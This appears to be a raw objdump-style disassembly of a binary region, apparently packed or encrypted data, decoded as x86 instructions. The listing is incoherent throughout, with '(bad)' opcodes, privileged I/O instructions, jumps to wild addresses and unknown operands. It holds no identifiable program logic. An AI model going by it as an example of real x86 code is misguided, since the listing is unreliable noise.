  418d43:	ja     0x418d59
  418d45:	test   eax,0xca8b3f07
  418d4a:	pop    eax
  418d4b:	popf   
  418d4c:	push   ss
  418d4d:	adc    DWORD PTR [ecx-0x2ecee004],edi
  418d53:	(bad)  
  418d54:	stc    
  418d55:	enter  0xc443,0x3e
  418d59:	je     0x418db7
  418d5b:	pop    esp
  418d5c:	fist   DWORD PTR [ebx+0x4a]
  418d5f:	add    BYTE PTR [edx-0x39],dl
  418d62:	ss mov cs,WORD PTR cs:[esi]
  418d66:	adc    DWORD PTR [ecx-0x33],ebp
  418d69:	clc    
  418d6a:	cld    
  418d6b:	pop    ss
  418d6c:	(bad)
  418d6f:	jne    0x418dee
  418d71:	mov    bh,0x8b
  418d73:	inc    ebp
  418d74:	div    DWORD PTR [ecx-0x43eb40dc]
  418d7a:	mov    dl,0x66
  418d7c:	push   edi
  418d7d:	mov    DWORD PTR [edi+0x2504088a],ebp
  418d83:	lods   eax,DWORD PTR ss:[esi]
  418d85:	sub    esp,edi
  418d87:	sub    bl,BYTE PTR [ecx-0x1d]
  418d8a:	and    bl,BYTE PTR [edx]
  418d8c:	xchg   esp,eax
  418d8d:	ja     0x418db7
  418d8f:	adc    DWORD PTR [edi+0x1d],esi
  418d92:	sti    
  418d93:	add    al,0x39
  418d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d96:	fsin   
  418d98:	addr16 adc eax,0x5ead9b8b
  418d9e:	fisttp QWORD PTR [ebx+ecx*1+0xe41f198]
  418da5:	test   BYTE PTR [eax+ebp*1],dh
  418da8:	inc    ecx
  418da9:	xchg   BYTE PTR [esi-0x779af15f],bh
  418daf:	cmp    BYTE PTR [edi],0x13
  418db2:	(bad)  
  418db3:	mov    edi,0xf1f8ac9
  418db8:	mov    edx,0x98eaa889
  418dbd:	mov    ecx,DWORD PTR [edi]
  418dbf:	std    
  418dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dc1:	adc    ah,bl
  418dc3:	push   edx
  418dc4:	cmp    al,0x69
  418dc6:	pop    ebp
  418dc7:	aas    
  418dc8:	into   
  418dc9:	ja     0x418dda
  418dcb:	pop    ss
  418dcc:	and    BYTE PTR [edx+0x331381e5],dh
  418dd2:	out    dx,al
  418dd3:	(bad)  
  418dd4:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  418dd6:	into   
  418dd7:	lods   eax,DWORD PTR ds:[esi]
  418dd8:	iret   
  418dd9:	(bad)  
  418dda:	fadd   QWORD PTR [ebp+0x153ceb12]
  418de0:	pop    ss
  418de1:	test   eax,0xe170d790
  418de6:	cdq    
  418de7:	mov    bh,0x25
  418de9:	push   ss
  418dea:	(bad)
  418dee:	jmp    0x8a66e063
  418df3:	xor    ah,dl
  418df5:	add    edx,edi
  418df7:	lods   eax,DWORD PTR ds:[esi]
  418df8:	jp     0x418d87
  418dfa:	dec    edi
  418dfb:	cmp    DWORD PTR [ecx+ebx*1-0x5e380fe2],edx
  418e02:	int3   
  418e03:	out    0x32,eax
  418e05:	neg    BYTE PTR [ecx-0x1c1cb62f]
  418e0b:	bsr    ecx,DWORD PTR [ebx+0x38]
  418e0f:	cmp    eax,0x0
	...
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x67]
  418e81:	cwde   
  418e82:	mov    esp,DWORD PTR [ebp+0x107b0]
  418e88:	add    al,0x1
  418e8a:	add    BYTE PTR [eax],al
  418e8c:	push   ds
  418e8d:	pusha  
  418e8e:	mov    eax,ds:0xc95a11be
  418e93:	adc    dl,BYTE PTR ds:[edi+0x2d]
  418e97:	scas   al,BYTE PTR es:[edi]
  418e98:	ins    DWORD PTR es:[edi],dx
  418e99:	pop    ecx
  418e9a:	xor    bh,ah
  418e9c:	pop    ebp
  418e9d:	fs popf 
  418e9f:	sub    eax,eax
  418ea1:	icebp  
  418ea2:	cmp    BYTE PTR [ecx],bl
  418ea4:	test   BYTE PTR [ecx+0x1a],al
  418ea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ea8:	sub    esi,edi
  418eaa:	jno    0x418e7b
  418eac:	test   dl,cl
  418eae:	test   BYTE PTR [ecx+0x44],cl
  418eb1:	jae    0x418ef3
  418eb3:	sbb    DWORD PTR [ebx],esi
  418eb5:	mov    edi,DWORD PTR ds:0xbc18335b
  418ebb:	adc    eax,0xbac87691
  418ec0:	mov    edi,0xafb09dfa
  418ec5:	fchs   
  418ec7:	aam    0x35
  418ec9:	dec    ecx
  418eca:	out    0x94,eax
  418ecc:	xchg   ebx,eax
  418ecd:	je     0x418f41
  418ecf:	pop    esp
  418ed0:	cld    
  418ed1:	shr    eax,cl
  418ed3:	jl     0x418e7a
  418ed5:	es lahf 
  418ed7:	dec    ecx
  418ed8:	add    al,0xaa
  418eda:	fsub   st,st(6)
  418edc:	push   ebx
  418edd:	cmp    cl,BYTE PTR [edi-0x346c90f7]
  418ee3:	or     DWORD PTR [ecx],eax
  418ee5:	cmp    bh,BYTE PTR [ecx+ebx*4-0x3e8ea951]
  418eec:	in     eax,dx
  418eed:	push   ecx
  418eee:	xor    al,0x10
  418ef0:	leave  
  418ef1:	adc    edi,ecx
  418ef3:	push   cs
  418ef4:	sahf   
  418ef5:	sbb    al,0x60
  418ef7:	pop    edx
  418ef8:	pop    esp
  418ef9:	sub    dl,BYTE PTR es:[esi]
  418efc:	or     BYTE PTR [ebp+0x5aa30be3],dh
  418f02:	and    edi,DWORD PTR [esi+0x18]
  418f05:	cld    
  418f06:	stos   DWORD PTR es:[edi],eax
  418f07:	inc    esp
  418f08:	pop    esp
  418f09:	inc    edi
  418f0a:	push   cs
  418f0b:	pop    es
  418f0c:	(bad)  
  418f0e:	push   esi
  418f0f:	fwait
  418f10:	retf   
  418f11:	cmp    BYTE PTR [ebx-0x286428d7],al
  418f17:	mov    ds:0xb2eaf0ce,al
  418f1c:	dec    ebp
  418f1d:	mov    esi,0x5e4a64d2
  418f22:	or     bh,BYTE PTR [ecx]
  418f24:	xchg   esp,eax
  418f25:	sbb    edi,DWORD PTR [ecx]
  418f27:	push   0x66797e77
  418f2c:	stc    
  418f2d:	icebp  
  418f2e:	pop    edx
  418f2f:	sahf   
  418f30:	into   
  418f31:	(bad)  
  418f32:	push   ebx
  418f33:	cld    
  418f34:	call   0x8d860aab
  418f39:	lods   eax,DWORD PTR ds:[esi]
  418f3a:	or     DWORD PTR [edi+0x2dc85f70],esi
  418f40:	loop   0x418f56
  418f42:	lds    esi,FWORD PTR [esi]
  418f44:	add    DWORD PTR [esi],0x8
  418f47:	xchg   edi,eax
  418f48:	and    al,0xc3
  418f4a:	loopne 0x418faf
  418f4c:	jae    0x418ee8
  418f4e:	pop    esi
  418f4f:	sbb    al,0xb5
  418f51:	add    ch,BYTE PTR [ecx]
  418f53:	adc    al,0xcd
  418f55:	mov    al,ds:0xfab69c54
  418f5a:	rcl    BYTE PTR [ebx-0x39],0x51
  418f5e:	mov    al,0x68
  418f60:	in     eax,0x3d
  418f62:	push   0xffffffc2
  418f64:	jnp    0x418f97
  418f66:	push   eax
  418f67:	and    bh,BYTE PTR [esi-0x6e]
  418f6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f6b:	and    eax,0x6b60fd0f
  418f70:	gs cwde 
  418f72:	push   ebx
  418f73:	jae    0x418f8f
  418f75:	sub    eax,0x19fa8482
  418f7a:	pop    edi
  418f7b:	mov    ah,0x2d
  418f7d:	imul   DWORD PTR [edi+edi*1+0x5a51ded8]
  418f84:	xchg   BYTE PTR [edx],dl
  418f86:	gs dec eax
  418f88:	adc    al,0xc5
  418f8a:	sbb    esi,edi
  418f8c:	or     DWORD PTR [ebx],ebp
  418f8e:	xchg   BYTE PTR [eax+eax*1+0x0],bl
	...
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx-0x4b150e59]
  419001:	xor    eax,0x8b46eff
  419006:	add    DWORD PTR [eax],eax
  419008:	add    al,0x1
  41900a:	add    BYTE PTR [eax],al
  41900c:	sbb    DWORD PTR [esi+0x101e732],ebx
  419012:	ror    DWORD PTR [esp+ecx*2-0x3a],0x59
  419017:	sub    esi,eax
  419019:	ret    
  41901a:	jmp    0xc62e:0xe0ebe4c
  419021:	pop    ebx
  419022:	and    ch,bh
  419024:	out    0x20,eax
  419026:	aam    0x41
  419028:	adc    DWORD PTR [ecx+0x69],edx
  41902b:	fcom   st(5)
  41902d:	cmp    esp,esi
  41902f:	pop    edx
  419030:	sub    eax,0x1c261fbd
  419035:	ja     0x418fed
  419037:	add    BYTE PTR es:[ecx],cl
  41903a:	xor    ebp,DWORD PTR [edx+edx*1]
  41903d:	xor    eax,0x47556603
  419042:	and    BYTE PTR [ebx+0x3b],al
  419045:	std    
  419046:	sub    BYTE PTR gs:[ebp-0x24],bl
  41904a:	popa   
  41904b:	pop    esp
  41904c:	xor    al,0xbe
  41904e:	(bad)  
  41904f:	xchg   DWORD PTR [edx],ebx
  419051:	call   FWORD PTR [edi-0xa]
  419054:	mov    ?,WORD PTR [eax+0x3c]
  419057:	fild   DWORD PTR [ecx]
  419059:	mov    dl,0x5c
  41905b:	mov    al,0x80
  41905d:	cdq    
  41905e:	jecxz  0x418fe1
  419060:	mov    es,WORD PTR [ecx+0xa258339]
  419066:	cmp    edi,edi
  419068:	and    dl,BYTE PTR [esi]
  41906a:	sbb    al,0xb4
  41906c:	shr    DWORD PTR [esi+0x1c726863],cl
  419072:	xchg   esi,eax
  419073:	sbb    edi,ebp
  419075:	dec    ecx
  419076:	pop    eax
  419077:	in     eax,0xd0
  419079:	pop    eax
  41907a:	cmp    eax,0x7b1fbc29
  41907f:	fsubr  QWORD PTR [esi-0x6722223f]
  419085:	out    0x9e,eax
  419087:	hlt    
  419088:	cmp    DWORD PTR [ebx],esp
  41908a:	xor    eax,DWORD PTR [ecx]
  41908c:	pop    esi
  41908d:	(bad)  
  41908e:	mov    edi,0xc3beb36c
  419093:	imul   ecx,DWORD PTR [ebx+edi*4],0xd23f20fe
  41909a:	stc    
  41909b:	inc    ebp
  41909c:	dec    eax
  41909d:	sbb    DWORD PTR [ecx-0x5075b371],eax
  4190a3:	dec    esp
  4190a4:	stc    
  4190a5:	pushf  
  4190a6:	inc    esp
  4190a7:	loopne 0x419048
  4190a9:	popf   
  4190aa:	mov    ah,0x60
  4190ac:	icebp  
  4190ad:	inc    ecx
  4190ae:	daa    
  4190af:	jno    0x4190ec
  4190b1:	int    0x45
  4190b3:	mov    ch,0xac
  4190b5:	repz jnp 0x41911d
  4190b8:	fnsave [eax-0x18c68d2a]
  4190be:	xor    al,0x61
  4190c0:	hlt    
  4190c1:	fisub  DWORD PTR [edi+0x33]
  4190c4:	sub    al,0x7c
  4190c6:	mov    al,0x58
  4190c8:	dec    ebp
  4190c9:	cmp    al,0xb0
  4190cb:	dec    esi
  4190cc:	jl     0x41907c
  4190ce:	into   
  4190cf:	jle    0x419124
  4190d1:	jnp    0x41911b
  4190d3:	pushf  
  4190d4:	imul   ecx,esp,0xb98dec6c
  4190da:	ficom  WORD PTR [edi-0x727bc355]
  4190e0:	sub    DWORD PTR [ecx],ecx
  4190e2:	test   eax,0x6313ff92
  4190e7:	add    al,BYTE PTR [esi-0x53]
  4190ea:	xlat   BYTE PTR ds:[ebx]
  4190eb:	xchg   edi,eax
  4190ec:	mov    esp,0xb084237a
  4190f1:	dec    edx
  4190f2:	mov    cl,0x80
  4190f4:	cmp    DWORD PTR [ebx+0x46377ba5],esi
  4190fa:	dec    ebp
  4190fb:	push   0xb38610fc
  419100:	sar    ebp,cl
  419102:	in     al,dx
  419103:	ret    
  419104:	mov    edi,0x14c66ae1
  419109:	stc    
  41910a:	(bad)  
  41910b:	or     al,0x64
  41910d:	test   BYTE PTR [esi+0x5a],dl
	...
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     ah,cl
  419181:	cmp    ch,0xa0
  419184:	mov    eax,0x4000109
  419189:	add    DWORD PTR [eax],eax
  41918b:	add    BYTE PTR [eax-0x9560e32],ch
  419191:	nop
  419192:	bound  edi,QWORD PTR [ebx+edi*4]
  419195:	pop    esi
  419196:	pop    ebx
  419197:	xchg   edx,eax
  419198:	ror    BYTE PTR [esi],1
  41919a:	arpl   WORD PTR [ecx-0x71dc1416],di
  4191a0:	outs   dx,BYTE PTR ds:[esi]
  4191a1:	xor    eax,0x9a6b4b7d
  4191a6:	cmp    eax,0xc5854020
  4191ab:	sub    al,0xd3
  4191ad:	mov    ds:0xd3eb0d6e,al
  4191b2:	mov    edx,0xbb619e80
  4191b7:	imul   ebx,DWORD PTR [edx],0x62
  4191ba:	mov    al,0x9a
  4191bc:	pushf  
  4191bd:	call   0xafa928e9
  4191c2:	invd   
  4191c4:	push   ecx
  4191c5:	pop    esi
  4191c6:	inc    ebx
  4191c7:	icebp  
  4191c8:	neg    DWORD PTR [ebx+0x1e6b48b9]
  4191ce:	jecxz  0x41917a
  4191d0:	and    BYTE PTR [edx+ebx*1-0x68],0x96
  4191d5:	nop
  4191d6:	inc    ebp
  4191d7:	cwde   
  4191d8:	xchg   ebx,eax
  4191d9:	mov    al,ds:0x17d31aee
  4191de:	int3   
  4191df:	daa    
  4191e0:	out    0xd1,eax
  4191e2:	ret    
  4191e3:	fidivr DWORD PTR [ecx-0x23]
  4191e6:	loope  0x4191b8
  4191e8:	mov    edx,0x8252ecef
  4191ed:	outs   dx,BYTE PTR ds:[esi]
  4191ee:	lock cld 
  4191f0:	jae    0x419242
  4191f2:	retf   
  4191f3:	ret    0xe058
  4191f6:	shl    BYTE PTR [edx],1
  4191f8:	loope  0x41920e
  4191fa:	icebp  
  4191fb:	fcomp  QWORD PTR [edi-0x45]
  4191fe:	and    ch,ah
  419200:	or     al,0x8
  419202:	cmp    eax,0x8b22a71f
  419207:	inc    esp
  419208:	dec    edx
  419209:	inc    ebx
  41920a:	sub    eax,ebx
  41920c:	push   esp
  41920d:	mov    ecx,0x138ad7ed
  419212:	ins    DWORD PTR es:[edi],dx
  419213:	(bad)  
  419215:	int    0xc2
  419217:	rcr    BYTE PTR [ecx+0x4ff98f51],1
  41921d:	call   0xf87f78f7
  419222:	xchg   BYTE PTR [ecx+edx*2+0x19],ch
  419226:	or     ch,ah
  419228:	lds    ebx,FWORD PTR [edi]
  41922a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41922b:	adc    ecx,ecx
  41922d:	loopne 0x4191af
  41922f:	popf   
  419230:	imul   esi,DWORD PTR [ebx],0xffffffd4
  419233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419234:	push   ecx
  419235:	mov    edi,0x9d7f85eb
  41923a:	test   eax,0x277ab3d0
  41923f:	add    eax,0xfcd34c20
  419244:	xor    esi,ecx
  419246:	push   esp
  419247:	and    DWORD PTR [ecx-0x4136aadb],ecx
  41924d:	arpl   WORD PTR ds:0x3ecf7860,si
  419253:	push   ebx
  419254:	dec    edi
  419255:	ds push ds
  419257:	pusha  
  419258:	shl    BYTE PTR [ebp-0x3c38db82],1
  41925e:	cmp    esp,ecx
  419260:	imul   ebp,DWORD PTR [eax],0x15139cfd
  419266:	leave  
  419267:	or     ebp,DWORD PTR [ebx+0x20e46474]
  41926d:	stc    
  41926e:	add    al,0x1e
  419270:	fidivr WORD PTR [esp+eiz*4+0x74]
  419274:	js     0x4192c3
  419276:	sbb    BYTE PTR [edi+0x1a68c5ee],bl
  41927c:	shl    dh,0x2e
  41927f:	xchg   edx,eax
  419280:	mov    dl,0x6b
  419282:	sbb    cl,BYTE PTR [eax+eiz*8+0x65dad2ce]
  419289:	cmp    BYTE PTR [esi],dh
  41928b:	punpcklwd mm4,DWORD PTR [esi+0xf769]
	...
  4192f2:	add    BYTE PTR [eax],al
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	dec    edi
  419301:	jb     0x4192dc
  419303:	popa   
  419304:	mov    esp,0x400010a
  419309:	add    DWORD PTR [eax],eax
  41930b:	add    BYTE PTR [ecx+ecx*4],bh
  41930e:	test   DWORD PTR [ebx+0xb],ebp
  419311:	and    DWORD PTR [esi],edx
  419313:	in     al,dx
  419314:	js     0x41932c
  419316:	(bad)  
  419317:	icebp  
  419318:	push   es
  419319:	xchg   esp,eax
  41931a:	jne    0x419333
  41931c:	inc    edx
  41931d:	mov    bh,0xb
  41931f:	fstp   QWORD PTR [edi+0x31]
  419322:	xchg   ebp,eax
  419323:	int    0x17
  419325:	fsub   st(3),st
  419327:	cmp    ebx,DWORD PTR [eax-0x4e]
  41932a:	hlt    
  41932b:	jae    0x4192e9
  41932d:	inc    ebx
  41932e:	sbb    eax,0x2bcaf1c1
  419333:	repz fidivr DWORD PTR gs:[edi]
  419337:	sbb    al,bh
  419339:	hlt    
  41933a:	add    al,dl
  41933c:	popf   
  41933d:	out    0xf8,eax
  41933f:	pop    ecx
  419340:	imul   edi,ebp,0xaf0b9f46
  419346:	add    al,BYTE PTR [ebx+0x79]
  419349:	inc    ecx
  41934a:	sub    bl,bh
  41934c:	push   0x74
  41934e:	pop    edx
  41934f:	dec    ebx
  419350:	adc    al,0x61
  419352:	fisttp QWORD PTR [esi]
  419354:	mov    dh,BYTE PTR [esi-0x30]
  419357:	or     al,0x50
  419359:	stc    
  41935a:	ror    esi,0x8
  41935d:	shr    DWORD PTR [eax+edx*4-0x266b5ac7],cl
  419364:	or     esp,DWORD PTR [ebp+eiz*1+0x4f]
  419368:	push   edx
  419369:	jmp    0x2442f38c
  41936e:	mov    eax,DWORD PTR [ebx]
  419370:	and    esi,esp
  419372:	es cs pop esp
  419375:	adc    eax,0x8f81425c
  41937a:	(bad)  
  41937c:	dec    esp
  41937d:	cmp    al,0x8c
  41937f:	out    0xed,eax
  419381:	sti    
  419382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419383:	and    BYTE PTR [eax-0x1ec87810],ch
  419389:	and    eax,0x29e0ffc2
  41938e:	fcomp  DWORD PTR [edi+esi*1-0x3aec5cd2]
  419395:	(bad)  
  419397:	cdq    
  419398:	mov    edx,0x1359628e
  41939d:	fs mov ebp,0x66028a6b
  4193a3:	adc    esi,0x36
  4193a6:	and    al,BYTE PTR [ebx-0xef86444]
  4193ac:	jno    0x4193d7
  4193ae:	push   es
  4193af:	and    eax,0xb1892302
  4193b4:	mov    cl,0x35
  4193b6:	adc    eax,0x9ffa2c6c
  4193bb:	pop    ebp
  4193bc:	iret   
  4193bd:	pop    ss
  4193be:	arpl   cx,ax
  4193c0:	cmp    dl,cl
  4193c2:	mov    ss:0x71a2283d,eax
  4193c8:	in     eax,dx
  4193c9:	jecxz  0x4193af
  4193cb:	sbb    eax,0x7c7463b5
  4193d0:	iret   
  4193d1:	sbb    ecx,DWORD PTR [ebx+esi*8+0x12]
  4193d5:	mov    edi,0x62bbb69a
  4193da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193db:	fnstenv [esi]
  4193dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193de:	pop    ds
  4193df:	dec    ebp
  4193e0:	or     cl,dh
  4193e2:	enter  0xd2c6,0xad
  4193e6:	ja     0x419427
  4193e8:	sub    ebx,DWORD PTR [ecx*4+0x3cdd0064]
  4193ef:	sub    DWORD PTR [esi-0x5d],ebx
  4193f2:	and    BYTE PTR [eax-0x5a],cl
  4193f5:	xchg   esi,eax
  4193f6:	mov    al,dh
  4193f8:	cs test eax,0x430bdefe
  4193fe:	inc    esp
  4193ff:	imul   ebp,DWORD PTR [eax],0x8af40
  419405:	mov    esi,0xc47ac2b9
  41940a:	inc    esi
  41940b:	sbb    al,0xd7
  41940d:	in     al,0xf4
  41940f:	adc    BYTE PTR [eax],al
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	xchg   esp,eax
  419481:	stos   DWORD PTR es:[edi],eax
  419482:	arpl   WORD PTR [edx+0x10bc0],dx
  419488:	add    al,0x1
  41948a:	add    BYTE PTR [eax],al
  41948c:	xchg   edx,eax
  41948d:	inc    edx
  41948e:	mov    DWORD PTR [edx-0x41],ebx
  419491:	aaa    
  419492:	out    dx,eax
  419493:	jb     0x419480
  419495:	and    cl,BYTE PTR [edx-0x221968dc]
  41949b:	xor    BYTE PTR [eax],bl
  41949d:	lock retf 
  41949f:	and    al,0x15
  4194a1:	arpl   bp,dx
  4194a3:	cli    
  4194a4:	jmp    0x419426
  4194a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194a7:	adc    DWORD PTR [ecx+ebp*2-0x21],esi
  4194ab:	cmp    BYTE PTR [ebx+0x36f6ffd6],dl
  4194b1:	je     0x419442
  4194b3:	mov    al,ds:0x41d944e4
  4194b8:	push   0xffffffdd
  4194ba:	add    DWORD PTR [ebx],esp
  4194bc:	mov    ?,WORD PTR [edi+eax*2+0x7f]
  4194c0:	nop
  4194c1:	outs   dx,DWORD PTR ds:[esi]
  4194c2:	mov    cl,BYTE PTR [edx+0x10]
  4194c5:	scas   eax,DWORD PTR es:[edi]
  4194c6:	cmp    BYTE PTR [eax-0x1e],bl
  4194c9:	mov    esp,0xfdd7b024
  4194ce:	add    DWORD PTR [edi-0x1a313fc],edi
  4194d4:	jbe    0x419499
  4194d6:	mov    ah,0x8e
  4194d8:	pushf  
  4194d9:	mov    eax,?
  4194db:	mov    ds:0x62ae06a3,eax
  4194e0:	xor    al,0x5e
  4194e2:	(bad)  
  4194e3:	fs out 0x19,eax
  4194e6:	in     al,0x72
  4194e8:	xor    edx,DWORD PTR [eax]
  4194ea:	xor    BYTE PTR [edi+0x51],bl
  4194ed:	adc    eax,0x9aa74eeb
  4194f2:	sbb    esi,esp
  4194f4:	xchg   esi,eax
  4194f5:	add    DWORD PTR [eax+0xd],ecx
  4194f8:	lds    eax,FWORD PTR [ebx]
  4194fa:	ror    BYTE PTR [eax+0x74497efc],cl
  419500:	fmul   DWORD PTR [edx-0x1efbba7b]
  419506:	mov    WORD PTR [eax-0x30],gs
  419509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41950a:	call   0x8737:0xa08e065f
  419511:	in     eax,dx
  419512:	pop    ss
  419513:	cs mov dh,0x72
  419516:	bound  ecx,QWORD PTR [ecx-0x70a5860]
  41951c:	jmp    0xd39274c7
  419521:	or     eax,0x90f8f620
  419526:	bound  ebp,QWORD PTR [edi-0x351a262a]
  41952c:	out    dx,eax
  41952d:	and    BYTE PTR [eax+edx*1+0x9b0d1a3],al
  419534:	adc    ebx,DWORD PTR [ebx-0x421bae61]
  41953a:	inc    edi
  41953b:	gs ins BYTE PTR es:[edi],dx
  41953d:	popf   
  41953e:	push   cs
  41953f:	jmp    0x4194c7
  419541:	std    
  419542:	outs   dx,BYTE PTR ds:[esi]
  419543:	jmp    0x419505
  419545:	add    esp,edx
  419547:	leave  
  419548:	popf   
  419549:	and    cl,ch
  41954b:	ins    DWORD PTR es:[edi],dx
  41954c:	push   ebx
  41954d:	sub    DWORD PTR [edi+ecx*2],eax
  419550:	add    DWORD PTR [ebx],ecx
  419552:	jb     0x41951f
  419554:	cmp    bh,BYTE PTR [edi-0x5b1aded]
  41955a:	enter  0x98c2,0xd3
  41955e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41955f:	leave  
  419560:	jecxz  0x4195d8
  419562:	mov    ebp,0xb3c37dbc
  419567:	stos   BYTE PTR es:[edi],al
  419568:	mov    ebx,DWORD PTR [esi-0x3727cd86]
  41956e:	daa    
  41956f:	add    eax,0x3eda225d
  419574:	sub    al,0xe7
  419576:	add    al,0x8e
  419578:	jns    0x4195df
  41957a:	test   al,0x3a
  41957c:	jp     0x419587
  41957e:	call   0x7a34c0bf
  419583:	pop    ebx
  419584:	jb     0x419528
  419586:	push   ecx
  419587:	outs   dx,DWORD PTR ds:[esi]
  419588:	or     al,0x57
  41958a:	cmp    eax,0xda3fcc77
  41958f:	test   BYTE PTR [eax],0x0
	...
  4195f2:	add    BYTE PTR [eax],al
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	push   ss
  419601:	pop    ds
  419602:	adc    DWORD PTR [edi-0x3c],esi
  419605:	or     al,0x1
  419607:	add    BYTE PTR [ecx+eax*1],al
  41960a:	add    BYTE PTR [eax],al
  41960c:	sbb    ebx,DWORD PTR [ecx]
  41960e:	mov    al,0xf4
  419610:	div    DWORD PTR [edi+0x5d]
  419613:	jne    0x419664
  419615:	repnz sbb BYTE PTR [eax],cl
  419618:	lds    esi,FWORD PTR [edx-0x44]
  41961b:	fiadd  DWORD PTR [ecx+0x7c7e11fd]
  419621:	mov    ch,0x2
  419623:	je     0x419682
  419625:	jns    0x41968d
  419627:	mov    bl,0xc2
  419629:	mov    bh,0x64
  41962b:	mov    ds:0x8ceb7339,eax
  419630:	add    BYTE PTR [ebx-0x68],cl
  419633:	pop    edx
  419634:	cmc    
  419635:	cmp    bh,BYTE PTR [edi+0x5f]
  419638:	scas   eax,DWORD PTR es:[edi]
  419639:	inc    edx
  41963a:	arpl   WORD PTR [esi-0xe],ax
  41963d:	xchg   esi,eax
  41963e:	cld    
  41963f:	in     al,0x48
  419641:	loopne 0x419611
  419643:	push   ebp
  419644:	cmp    bl,BYTE PTR [esi]
  419646:	mov    al,0x7c
  419648:	mov    ch,BYTE PTR [edx+0x22d63e45]
  41964e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41964f:	addr16 mov eax,0x944e8196
  419655:	jmp    0x4196d1
  419657:	test   eax,0x2e8058e4
  41965c:	dec    esp
  41965d:	jle    0x41964d
  41965f:	add    BYTE PTR [ecx+edi*4],ah
  419662:	ss pop ebx
  419664:	ret    
  419665:	jbe    0x4196ca
  419667:	fisttp DWORD PTR [edx]
  419669:	loope  0x4195fd
  41966b:	lods   eax,DWORD PTR ds:[esi]
  41966c:	sbb    al,0x99
  41966e:	inc    esi
  41966f:	xchg   eax,edx
  419671:	loope  0x4195fe
  419673:	mov    dh,0x3f
  419675:	adc    al,BYTE PTR [ebx]
  419677:	pop    esp
  419678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419679:	js     0x41965e
  41967b:	jge    0x4196b5
  41967d:	xchg   ebx,eax
  41967e:	mov    cl,0x87
  419680:	fild   WORD PTR [eax+ecx*1+0x6f03292d]
  419687:	inc    ecx
  419688:	add    eax,0xf22879d9
  41968d:	call   0x8a6d:0x1dade766
  419694:	mov    bl,0x34
  419696:	inc    ebx
  419697:	pop    esi
  419698:	adc    esp,esi
  41969a:	or     al,0xd4
  41969c:	lods   eax,DWORD PTR ds:[esi]
  41969d:	add    ecx,eax
  41969f:	idiv   ch
  4196a1:	mov    eax,ds:0xe13cfb24
  4196a6:	or     eax,0x427cc06a
  4196ab:	add    al,BYTE PTR [edi-0x75]
  4196ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196af:	push   esi
  4196b0:	or     eax,0xf8c0cc9
  4196b5:	cdq    
  4196b6:	(bad)  
  4196b7:	dec    eax
  4196b8:	loopne 0x4196ce
  4196ba:	mov    ds:0x80c45f12,al
  4196bf:	mov    esp,0x9cef10cb
  4196c4:	mov    DWORD PTR [esi+0x5e5b4050],ebp
  4196ca:	or     DWORD PTR [eax],eax
  4196cc:	xchg   edi,eax
  4196cd:	enter  0x1526,0x92
  4196d1:	out    dx,eax
  4196d2:	test   BYTE PTR [eax+0x7c],bh
  4196d5:	cmp    eax,0xca6c0bf7
  4196da:	xlat   BYTE PTR ds:[ebx]
  4196db:	mov    ch,0xac
  4196dd:	stc    
  4196de:	mov    edx,0x17b49d0d
  4196e3:	and    BYTE PTR [ebx+0xde8bd7a],ah
  4196e9:	dec    ecx
  4196ea:	cli    
  4196eb:	adc    BYTE PTR [edi+0x14a464fd],ch
  4196f1:	ffreep st(2)
  4196f3:	cmp    DWORD PTR [edx-0x664a15aa],esp
  4196f9:	cmp    al,0x72
  4196fb:	jne    0x4196df
  4196fd:	fisub  DWORD PTR [eax-0x74]
  419700:	push   ds
  419701:	jmp    0x662b:0xfe4e11e9
  419708:	jno    0x4196ff
  41970a:	mov    al,ds:0x9d14d796
  41970f:	iret   
	...
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x988dd0ae
  419781:	and    BYTE PTR [edi-0x2e],ah
  419784:	enter  0x10d,0x0
  419788:	add    al,0x1
  41978a:	add    BYTE PTR [eax],al
  41978c:	fwait
  41978d:	out    0xdf,al
  41978f:	add    ecx,ebp
  419791:	inc    eax
  419792:	and    ah,bh
  419794:	mov    ch,BYTE PTR [ecx+ebp*2+0x548a6501]
  41979b:	nop
  41979c:	pop    es
  41979d:	xlat   BYTE PTR ds:[ebx]
  41979e:	ret    0xf9a7
  4197a1:	shl    DWORD PTR [eax-0x7a7bcc34],1
